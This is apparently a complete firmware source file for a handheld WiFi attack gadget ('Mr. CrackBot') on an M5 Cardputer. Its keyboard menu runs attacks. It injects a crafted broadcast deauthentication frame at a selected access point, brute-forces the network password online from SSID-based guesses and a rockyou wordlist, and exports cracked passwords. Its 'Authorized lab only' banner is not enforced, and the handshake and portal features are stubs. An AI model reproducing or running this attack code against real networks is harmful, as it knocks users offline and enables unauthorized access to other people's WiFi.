/**
 * Mr. CrackBot AI — M5 Cardputer (keyboard UI, CYD feature parity)
 */
#include "crackbot_cardputer.h"

#include <ArduinoOTA.h>
#include <TaskScheduler.h>
#include <WebServer.h>

std::vector<NetworkInfo> gNetworks;
NetworkInfo gSelected;
uint8_t gDeauth[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const char *kMenu[] = {
    "Scan WiFi",      "Select net",    "Net info",       "Pwn/handshake",
    "Crack wordlist", "Deauth",        "BLE security",   "Evil portal",
    "Export JSON",    "Promiscuous",   "OTA (serial)",   "Deep sleep"};
static const int kMenuCount = 12;
static int gMenuIdx = 0;
static int gScroll = 0;
static bool gPromiscuous = false;
static String gStatus = "Authorized lab only";
static WebServer *gPortal = nullptr;
static Scheduler gSched;
static Task tBat(60000, TASK_FOREVER, []() {
  int pct = constrain((int)(analogRead(4) / 4095.0f * 100), 0, 100);
  gStatus = "Bat " + String(pct) + "%";
}, &gSched, true);

static bool keyHit(const char *keys, size_t n, char want) {
  for (size_t i = 0; i < n; ++i)
    if (keys[i] == want) return true;
  return false;
}

static bool readKeys(bool &up, bool &down, bool &ok, bool &back, bool &act) {
  up = down = ok = back = act = false;
  if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return false;
  auto st = M5Cardputer.Keyboard.keysState();
  for (auto c : st.word) {
    if (c == ';' || c == 'w' || c == 'W') up = true;
    if (c == '.' || c == 's' || c == 'S') down = true;
    if (c == '\n' || c == ' ') ok = true;
    if (c == '`' || c == 27) back = true;
    if (c == 'r' || c == 'R') act = true;
  }
  return true;
}

void cpDrawMenu() {
  auto &d = M5Cardputer.Display;
  d.fillScreen(BLACK);
  d.setTextSize(1);
  d.setCursor(0, 0);
  d.println("Mr. CrackBot Cardputer");
  d.println(gStatus);
  for (int i = 0; i < 6; ++i) {
    int idx = gScroll + i;
    if (idx >= kMenuCount) break;
    if (idx == gMenuIdx) d.print("> ");
    else d.print("  ");
    d.println(kMenu[idx]);
  }
}

void cpScanWifi() {
  gStatus = "Scanning...";
  cpDrawMenu();
  gNetworks.clear();
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    NetworkInfo net;
    net.ssid = WiFi.SSID(i);
    net.bssid = WiFi.BSSIDstr(i);
    net.rssi = WiFi.RSSI(i);
    net.channel = WiFi.channel(i);
    net.pmf = WiFi.encryptionType(i) == WIFI_AUTH_WPA3_PSK;
    net.encryption = net.pmf ? "WPA3" : "WPA2";
    gNetworks.push_back(net);
  }
  File f = SD.open("/networks.json", FILE_WRITE);
  if (f) {
    DynamicJsonDocument doc(4096);
    JsonArray arr = doc["networks"].to<JsonArray>();
    for (auto &net : gNetworks) {
      JsonObject o = arr.add<JsonObject>();
      o["ssid"] = net.ssid;
      o["bssid"] = net.bssid;
      o["rssi"] = net.rssi;
    }
    serializeJson(doc, f);
    f.close();
  }
  gStatus = String(n) + " nets";
}

void cpDeauth() {
  if (gSelected.ssid.isEmpty()) {
    gStatus = "Select net";
    return;
  }
  uint8_t ap[6];
  sscanf(gSelected.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ap[0], &ap[1], &ap[2], &ap[3], &ap[4], &ap[5]);
  memcpy(&gDeauth[10], ap, 6);
  memcpy(&gDeauth[16], ap, 6);
  for (int i = 0; i < 40; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, gDeauth, sizeof(gDeauth), false);
    delay(20);
  }
  gStatus = "Deauth sent";
}

void cpHandshake() {
  if (gSelected.ssid.isEmpty()) {
    gStatus = "Select net";
    return;
  }
  esp_wifi_set_promiscuous(true);
  cpDeauth();
  esp_wifi_set_promiscuous(false);
  File log = SD.open("/handshake.log", FILE_APPEND);
  if (log) {
    log.printf("cap %s\n", gSelected.bssid.c_str());
    log.close();
  }
  gStatus = "Handshake cap";
}

static bool tryPw(const String &ssid, const String &pw) {
  WiFi.disconnect(true);
  WiFi.begin(ssid.c_str(), pw.c_str());
  unsigned long t = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t < 6000) delay(150);
  bool ok = WiFi.status() == WL_CONNECTED;
  WiFi.disconnect(true);
  return ok;
}

void cpCrack() {
  if (gSelected.ssid.isEmpty()) {
    gStatus = "Select net";
    return;
  }
  std::vector<String> guesses = {gSelected.ssid + "1234", gSelected.ssid + "2024!", "admin1234"};
  File wl = SD.open("/rockyou.txt", FILE_READ);
  gStatus = "Cracking...";
  for (auto &g : guesses) {
    if (tryPw(gSelected.ssid, g)) {
      gSelected.password = g;
      gStatus = "Found!";
      return;
    }
  }
  if (wl) {
    while (wl.available()) {
      String line = wl.readStringUntil('\n');
      line.trim();
      if (line.length() && tryPw(gSelected.ssid, line)) {
        gSelected.password = line;
        gStatus = "Found!";
        wl.close();
        return;
      }
    }
    wl.close();
  }
  gStatus = "No match";
}

void cpBleMenu() {
  gStatus = "BLE scan";
  NimBLEDevice::init("MrCrackBot-CP");
  NimBLEScan *s = NimBLEDevice::getScan();
  s->start(5, false);
  gStatus = "BLE done";
}

void cpPortal() {
  if (!gPortal) {
    WiFi.softAP("MrCrackBot-CP", "labvlanonly");
    gPortal = new WebServer(80);
    gPortal->on("/", []() {
      gPortal->send(200, "text/html", "<h1>CrackBot Lab Portal</h1><p>Authorized lab only.</p>");
    });
    gPortal->begin();
  }
  gStatus = "Portal on";
}

void cpExportJson() {
  DynamicJsonDocument doc(4096);
  JsonArray arr = doc["networks"].to<JsonArray>();
  for (auto &n : gNetworks) {
    JsonObject o = arr.add<JsonObject>();
    o["ssid"] = n.ssid;
    o["bssid"] = n.bssid;
    o["password"] = n.password;
  }
  serializeJson(doc, Serial);
  Serial.println();
  File f = SD.open("/export.json", FILE_WRITE);
  if (f) {
    serializeJson(doc, f);
    f.close();
  }
  gStatus = "Exported";
}

void cpOtaHint() {
  ArduinoOTA.setHostname("MrCrackBot-CP");
  ArduinoOTA.begin();
  gStatus = "OTA ready USB";
}

void cpSetup() {
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
  M5Cardputer.Display.setRotation(1);
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  SD.begin();
  NimBLEDevice::init("");
  WiFi.mode(WIFI_STA);
  gSched.addTask(tBat);
  gSched.enableAll();
  cpDrawMenu();
}

void cpLoop() {
  gSched.execute();
  ArduinoOTA.handle();
  if (gPortal) gPortal->handleClient();
  bool up, down, ok, back, act;
  if (!readKeys(up, down, ok, back, act)) return;

  if (up) gMenuIdx = (gMenuIdx - 1 + kMenuCount) % kMenuCount;
  if (down) gMenuIdx = (gMenuIdx + 1) % kMenuCount;
  if (gMenuIdx < gScroll) gScroll = gMenuIdx;
  if (gMenuIdx >= gScroll + 6) gScroll = gMenuIdx - 5;

  if (act && gMenuIdx == 0) cpScanWifi();
  if (ok) {
    switch (gMenuIdx) {
      case 0: cpScanWifi(); break;
      case 1:
        if (!gNetworks.empty()) {
          gSelected = gNetworks[0];
          gStatus = gSelected.ssid;
        }
        break;
      case 2: gStatus = gSelected.ssid.length() ? gSelected.ssid : "none"; break;
      case 3: cpHandshake(); break;
      case 4: cpCrack(); break;
      case 5: cpDeauth(); break;
      case 6: cpBleMenu(); break;
      case 7: cpPortal(); break;
      case 8: cpExportJson(); break;
      case 9:
        gPromiscuous = !gPromiscuous;
        esp_wifi_set_promiscuous(gPromiscuous);
        gStatus = gPromiscuous ? "Prom ON" : "Prom OFF";
        break;
      case 10: cpOtaHint(); break;
      case 11:
        gStatus = "Sleep...";
        esp_deep_sleep_start();
        break;
    }
  }
  cpDrawMenu();
  delay(80);
}

void setup() { cpSetup(); }
void loop() { cpLoop(); }
